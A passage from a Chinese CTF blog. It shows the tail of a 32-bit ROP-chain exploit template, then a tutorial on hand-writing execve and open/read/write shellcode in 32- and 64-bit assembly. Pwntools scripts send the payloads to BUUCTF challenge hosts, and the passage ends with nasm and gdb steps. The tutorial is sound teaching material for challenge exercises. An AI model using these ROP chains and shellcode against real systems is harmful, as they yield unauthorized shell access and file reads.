ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line">r.sendline(p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>这就是定死的模板，没什么好说的。</p>
<p>如果手写的话也可以，原理的话上面解释过了，这个也可以当做模板来用，需要修改的参数，我后面加了三个*。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#d=remote(&#x27;node4.buuoj.cn&#x27;,25149)#***</span></span><br><span class="line">d=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">int_0x80_addr=<span class="number">0x0806cc25</span> <span class="comment">#*** 这些片段的话，直接用Ropgadget搜就可以了</span></span><br><span class="line">bss_addr=<span class="number">0x080e9000</span>      <span class="comment">#***这个用vmmap看一下哪里是可写的，然后放上这段可写的地址就行了</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080b81c6</span>  <span class="comment">#***</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080481c9</span>  <span class="comment">#***</span></span><br><span class="line">pop_ecx_addr=<span class="number">0x080de955</span>  <span class="comment">#***</span></span><br><span class="line">pop_edx_addr=<span class="number">0x0806f02a</span>  <span class="comment">#***</span></span><br><span class="line">pop_in_ecx_addr=<span class="number">0x0804b5ea</span><span class="comment">#*** 这个地方用这个指令找</span></span><br><span class="line"><span class="comment"># ROPgadget --binary  a | grep &#x27;pop dword ptr \[ecx\]&#x27; 这里不一定要ecx的，别的寄存器也可以</span></span><br><span class="line"></span><br><span class="line">payload=<span class="number">28</span>*<span class="string">&#x27;a&#x27;</span> <span class="comment">#***</span></span><br><span class="line"></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr) <span class="comment">#利用ecx当一个媒介，以此来让/bin/sh写到bss段，最后的00用来截断，不然execve接收参数的时候，它不知道什么时候参数截止。</span></span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)<span class="comment">#把ebx存入参数/bin/sh的地址</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(int_0x80_addr)</span><br><span class="line">d.sendline(payload)</span><br><span class="line">d.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/5062ac9d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/5062ac9d.html" class="post-title-link" itemprop="url">用汇编语言构造简单的shellcode（64位&&32位）以及将汇编语言转换成机器码的方法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:41:07" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="1、什么是shellcode"><a href="#1、什么是shellcode" class="headerlink" title="1、什么是shellcode"></a>1、什么是shellcode</h1><p>这里我谈谈自己的理解，shellcode就是一段可执行的机器码，如果可以让CPU从shellcode首字节开始往下执行，那么shellcode执行完毕就会达到编写者想要的目的（shellcode不一定非要是获取shell的机器码），至少初学者先这么理解应该是没什么问题的。</p>
<h1 id="2、怎么用汇编语言构造简单的shellcode-64位"><a href="#2、怎么用汇编语言构造简单的shellcode-64位" class="headerlink" title="2、怎么用汇编语言构造简单的shellcode(64位)"></a>2、怎么用汇编语言构造简单的shellcode(64位)</h1><p>前置知识：</p>
<p>① 64位寄存器传参的前三个寄存器分别是rdi,rsi,rdx</p>
<p>②64位系统调用号通过查看linux上的&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h文件就可以获取</p>
<p>③系统调用号放入rax寄存器，然后syscall就可以执行对应的系统调用函数</p>
<p>​		</p>
<blockquote>
<p>   首先我们的<strong>目的是执行execve(“&#x2F;bin&#x2F;sh”,0,0)</strong> 从而获取shell</p>
<p>   因此，我们需要干三件事情</p>
<p>   ①因为程序本来是没有这个execve函数的，但是我们现在要凭空给它造一个，因此这里系统调用execve（你可以理解为，执行syscall指令之前将rax装成对应的系统调用号，就可以执行对应的系统调用。</p>
<p>   ②将第一个参数存入”&#x2F;bin&#x2F;sh”</p>
<p>   ③将第二个、第三个参.数存入0</p>
</blockquote>
<p><strong>我们要做的是在系统调用execve之前，去把需要的参数都存进去。</strong></p>
<p>xor rdx,rdx</p>
<p>xor rsi,rsi  #此时去把rsi，rdx两个寄存器都存成0，至于这里为什么不用mov rdx,0和mov rsi,0。</p>
<p>主要是避免出现00字符来截断，不过话说，据我了解，平常如果是直接读入字符串的话，00也不会产生截断的效果，只有用strcpy这类函数的时候，才考虑00截断。不过那为什么我们平常写shellcode还是要尽量选择xor rsi,rsi而不是mov rsi,0呢，是因为xor rsi,rsi所需要的字节数更少。</p>
<p>这个具体截断的话，可以参考如下两张图片<br><img src="/../img/aImdexjb53GTHuP.png"></p>
<p><img src="/../img/ieYVwvDbsuX9qLk.png"></p>
<p>图片出自<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">CTF中常见的C语言输入函数截断属性总结 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
<p>接着是准备要把第一个参数存入rdi，以前我一直以为是rdi的写成&#x2F;bin&#x2F;sh对应的ascii码，可是现在才明白，<font color=red>我们只是要把&#x2F;bin&#x2F;sh对应的ascii码的*<u><strong>地址</strong></u>*给rdi即可</font>  传参的时候，要调用的函数会自己去这个地址里找到对应的&#x2F;bin&#x2F;sh。</p>
<p>因此这步要写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line"></span><br><span class="line">push rdi   #此时的rdi是0，要把这个0压入栈顶，当下面把0x68732f2f6e69622f压入栈顶之后，这个0就起到了截断字符串的作用（用来声明，execve的第一个参数字符串到哪结束）</span><br><span class="line"></span><br><span class="line">mov rdi,0x68732f2f6e69622f  #现在rdi的值是0x68732f2f6e69622f</span><br><span class="line"></span><br><span class="line">push rdi    #此时参数0x68732f2f6e69622f（即/bin//sh)就存在了栈顶的内存单元中</span><br><span class="line"></span><br><span class="line">lea rdi,[rsp]     #等同于mov rdi,rsp  此时是把**栈顶的地址**&lt;u&gt;*（**一定要注意，是栈顶的地址，就是rsp本身的值（rsp本身就是个地址）***&lt;/u&gt;，赋值给rdi，也就是说此时rdi的值就是参数的地址</span><br></pre></td></tr></table></figure>

<p>这里我还是想详细说一下，因为当初我在这里迷了很久。<font color=red>rsp的值和rsp的内容是两码事</font>，你<strong>可以把他们理解成c语言中的指针p和*p的关系</strong>。<u>rsp的值，就是栈顶内存单元的地址；rsp的内容，就是栈顶的内存单元中的内容。此时rsp的内容才是0x68732f2f6e69622f，而现在只是把栈顶的地址赋给了rdi的值</u>。</p>
<p>现在也才是我们要的效果，<font color=red>rdi里面装的是&#x2F;bin&#x2F;&#x2F;sh的地址，而非参数本身</font>。</p>
<p> 这里有两点需要注意：</p>
<p>①这个0x68732f2f6e69622f是&#x2F;bin&#x2F;&#x2F;sh对应的ascii码。<strong>并且他是倒着存的</strong>，因为asm在把我们写的<strong>汇编语言转换成机器码的时候，会因为小端序的原因将输入的内容给倒过来</strong>。别的机器码我们不用担心，<u>但是我们输入的字符串，需要手动先给倒过来一次，这样等到汇编语言转换成机器码的时候，再倒过来一次，程序处理字符串的时候，就会拿到真正的参数&#x2F;bin&#x2F;&#x2F;sh，而非hs&#x2F;&#x2F;nib&#x2F;</u>。</p>
<p>②<strong>0x68732f2f6e69622f中间这里出现了两2f(也就是两个&#x2F;)，因为这里要填充够八个字节（64位程序中，一个内存单元就只能装八个字节）</strong></p>
<p>为了达到上述的效果，我们还可以这么写。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line"></span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line"></span><br><span class="line">push rdi</span><br><span class="line"></span><br><span class="line">push rsp</span><br><span class="line"></span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure>

<p>有好几处内容都变了。</p>
<p>首先是原本xor rdi,rdi下面的push rdi没了，咦？难道我们不需要去在栈中存入一个零，以来声明字符串的结束么？我们依然需要一个00来去截断字符串，但是此刻你还会发现0x68732f6e69622f中间的两个2f现在就变成了一个2f（此时参数是&#x2F;bin&#x2F;sh） 难道此时不需要去填充够八字节么。是的不需要了，<font color=red>程序发现了我们这个内存单元的内容不够八字节，它会自己帮我们添加一个00上去以来凑齐八字节，并且这个00同时声明了字符串的结束。</font></p>
<p><strong>因此我们不但不需要push一个0，并且还不用去填充八字节，程序帮我们补的00，正好可以去代替原本应该push的0。（值得一提的是如果我们内存单元只有六个字节，那么程序依然会帮我们补全到八个字节，也就是填充两个字节的00）</strong></p>
<p>最后的变化就是把原本的lea rdi,[rsp]换成了一个push rsp ;pop rdi<strong>（把rsp的值压入栈顶，也就是把rsp的值存入了栈顶内存单元的内容中，再把栈顶的内存单元的内容弹给rdi的值，也就完成了把rsp的值赋给了rdi的值）</strong><u><strong>（在这里一定要区分清楚值与内容的关系）</strong></u>这样做的好处是什么？这样写的字节更少，原本lea rdi,[rsp]是四个字节<br><img src="/../img/n5Jma4K2OYQ7BXS.png"></p>
<p>即使换成mov rdi,rsp<br><img src="/../img/w4jVgyLbMYJsPnQ.png"></p>
<p>也还是三个字节。但是我们为了达到同样的效果，使用push rsp;pop rdi两个指令，一共也才两个字节。<br><img src="/../img/LNjIfuTtpRzWJYc.png"></p>
<p>因为很多有难度的题目都会限制shellcode的长度，<em>因此我们所选的shellcode，是越短越好。</em></p>
<p>最后，就是将execve对应的系统调用号放入rax中，然后syscall即可</p>
<p>那剩下的汇编就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line"></span><br><span class="line">mov rax,0x3b</span><br><span class="line"></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>


<p>然后把刚才所写的三部分汇总一下并且精简一下最后仅仅用了0x1e个字节。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi ,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p><img src="/../img/TNoUnRDAEt1FYai.png"></p>
<p>此时只要执行这个shellcode，就可以去拿到shell了。</p>
<p><strong>注意:</strong> 由于压入参数&#x2F;bin&#x2F;sh的时候最后一个默认补了00，导致碰见memcpy等函数shellcode会被截断，这里可以用&#x2F;bin&#x2F;&#x2F;sh来代替，更新过的shellcode如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi ,0x68732f2f6e69622f</span><br><span class="line">xor rsi,rsi</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<p>这里拿一道BUUCTF上的mrctf2020_shellcode来演示一下</p>
<p>使用IDA分析之后（这道题无法F5，不过可以看汇编来分析），发现我们输入的内容直接就被执行了，因此什么都不用考虑，这道题仅仅就是考察我们64位汇编编写shellcode的能力。利用pwntools中的asm把刚才写好的汇编内容转换成机器码，然后发送过去即可获取shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27143</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="3、怎么用汇编语言构造简单的shellcode（32位）"><a href="#3、怎么用汇编语言构造简单的shellcode（32位）" class="headerlink" title="3、怎么用汇编语言构造简单的shellcode（32位）"></a>3、怎么用汇编语言构造简单的shellcode（32位）</h1><p>前置知识：</p>
<p>①对于32位程序而言，我们最后系统调用采用的并不是syscall，而是int 0x80</p>
<p>②我们传参的前三个寄存器分别是ebx,ecx,edx</p>
<p>③32位的execve系统调用号是11，并且存储系统调用后的寄存器是eax。32位的系统调用号可以查看这个文件&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h</p>
<p>然后剩下的思路是和64位汇编构造shellcode的思路是一样的。</p>
<p>首先是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br></pre></td></tr></table></figure>

<p>清空两个参数为0的寄存器</p>
<p>然后是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br></pre></td></tr></table></figure>

<p>此时把参数&#x2F;bin&#x2F;sh压入栈，最开始push ebx是先压入栈中一个0，用来字符串截断。最后将esp指向的地址赋给了ebx，此时ebx的值就是&#x2F;bin&#x2F;sh的地址。</p>
<p><img src="/../img/HwopUbyABF6SDzc.png"></p>
<p>此时栈中的情况就是这样，&#x2F;bin&#x2F;sh与&#x2F;bin&#x2F;&#x2F;sh的效果一样，至于为什么要存入字符串的时候，要反着写，在64位汇编编写shellcode的时候，已经解释过了，这里就不再重复。</p>
<p>最后是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor eax,eax</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<p>现在是把系统调用号存进去并且进行了系统调用</p>
<p>最后把这三部分结合一下效果如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<h1 id="4、手写open，read，write的shellcode"><a href="#4、手写open，read，write的shellcode" class="headerlink" title="4、手写open，read，write的shellcode"></a>4、手写open，read，write的shellcode</h1><p>遇见pwn题开启了沙箱保护的话，如果禁用了execve、system函数，但没有开启NX保护的话，可以采用orw的方式来读出flag。</p>
<p>首先我们要执行的如下的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)<span class="comment">#第一个参数是3，因为一个进程有默认的文件描述符0,1,2。当再打开新的文件之后，文件描述符就会以此类推的分配，因此上面open新打开的flag文件的文件描述符就是3</span></span><br><span class="line"><span class="comment">#至于这个addr，把读出来的flag放到哪，一会再说</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure>

<p>接下来，就开始用汇编来实现上面的内容(先写64位的)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">#上面这两步就是在传open的第一个参数，这个参数要是一个地址，这个地址要指向字符串&#x27;flag&#x27;</span><br><span class="line">#执行完push 0x67616c66的时候，栈顶的内容就是字符串flag，而栈顶指针rsp就指向了这个flag，</span><br><span class="line">#此时执行push rsp将指向flag的地址（也就是rsp）压栈，此时栈顶的内容就是那个指向flag的地址，然后再执行pop rdi</span><br><span class="line">#将栈顶的这个内容弹给rdi，此时open的第一个参数就成为了指向flag的地址</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">read(3,addr,0x50)</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">#上面这两步在完成read函数的第二个参数传参，此时压入栈的rsp，我并不知道这个栈地址具体是多少</span><br><span class="line">#只知道把这个地址给rsi的话，flag就会被写到这个地址里面，至于这个地址具体是什么并不重要（只要不会导致堆栈崩溃的话）</span><br><span class="line">#重要的是要保证接下来write的第二个参数也是这个地址即可，而我们要做的就是保证接下来的</span><br><span class="line">#每一个push都要对应一个pop，这样栈顶始终就是给当初rsi的那个地址了。</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">write(1,addr,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">#这个地方的push rsp pop rsi原理同上</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来是32位的，32位和64位编写的区别主要是<strong>寄存器不同</strong>和<strong>系统调用号不同</strong>，另外就是<strong>再压入参数’flag’的时候，32位的需要提前压入00用来截断字符串</strong>（64位不需要push 0的原因是存入的’flag’不足8字节，会自动添加00来截断）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0</span><br><span class="line">push 0x67616c66</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push 5</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 3</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 4</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<h1 id="5、如何调试或测试写好的汇编代码？"><a href="#5、如何调试或测试写好的汇编代码？" class="headerlink" title="5、如何调试或测试写好的汇编代码？"></a>5、如何调试或测试写好的汇编代码？</h1><p>因为在编写shellcode的时候，并不是一帆风顺的，如果出现了错误只靠眼睛看的话效果不大，因此我们可以把汇编代码编译为可执行文件，用gdb来调试。</p>
<p>先用touch shellcode.asm  命令创建一个shellcode.asm文件(asm文件是使用汇编语言编写的源代码文件)</p>
<p>然后vim shellcode.asm  去编辑这个文件</p>
<p>将汇编的内容写入这个文件里面。</p>
<p>（同时在文件的开头写上下面三行的内容，其作用可以自行参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lazypigwhy/articles/14112041.html">【转】linux汇编.section .text .data 与.global - 比较懒 - 博客园 (cnblogs.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br></pre></td></tr></table></figure>

<p>最后的写入的内容应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>


<p>然后用nasm -f elf64 shellcode.asm这个命令去编译刚才写的那个文件（会生成一个.o文件）</p>
<p>然后可以用 objdump -d shellcode.o （直接查看的话，是看的AT&amp;T语法的汇编，如果想看intel语法的话加上-M intel参数即可</p>
<p><img src="/../img/HOilK7ZeAynEY5m.png"></p>
<p>此时就获取到了汇编指令的机器码。</p>
<p>不过由于目前生成的仅仅是.o文件，没有被链接过，还无法执行或者调试。因此我们需要链接一下。</p>
<p>输入命令ld -s -o shellcode shellcode.o 即可</p>
<p>此时执行生成的shellcode就成功了（如下图）</p>
<p><img src="/../img/wX7aQLldJvpA6xU.png" alt="image-20220607171010492"></p>
<p>如果想调试的话，直接gdb挂上，然后start就可以开始调试我们写的shellcode了（如下图）</p>
<p><img src="/../img/LKn97vORyN8bX1j.png" alt="image-20220607171241208"><br><strong>补充：推荐一个在线汇编指令转机器码的网站  <a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm#disassembly">here</a></strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/6/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
